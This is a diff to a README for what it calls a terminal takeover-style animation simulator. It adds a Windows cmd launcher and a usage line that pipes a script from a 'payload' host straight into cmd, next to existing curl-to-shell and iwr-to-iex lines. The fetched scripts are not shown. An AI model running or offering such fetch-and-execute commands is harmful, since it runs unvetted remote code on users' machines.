@@ -9,6 +9,7 @@ This project hosts a terminal takeover-style animation simulator for demo use.
 - `/simulate.sh` -> shell animation script
 - `/entry.ps1` -> Windows PowerShell launcher
 - `/simulate.ps1` -> Windows PowerShell animation script
+- `/win.cmd` -> Windows Command Prompt launcher
 
 ## Usage
 
@@ -28,6 +29,12 @@ SIM_SPEED=fast SIM_INTENSITY=high curl -fsSL https://payload.citadel-codex.com |
 
 ```powershell
 iwr https://payload.citadel-codex.com/entry.ps1 -UseBasicParsing | iex
+```
+
+### Windows Command Prompt (`cmd.exe`)
+
+```bat
+curl -fsSL https://payload.citadel-codex.com/win.cmd | cmd
 ```
 
 ## Safety and Behavior
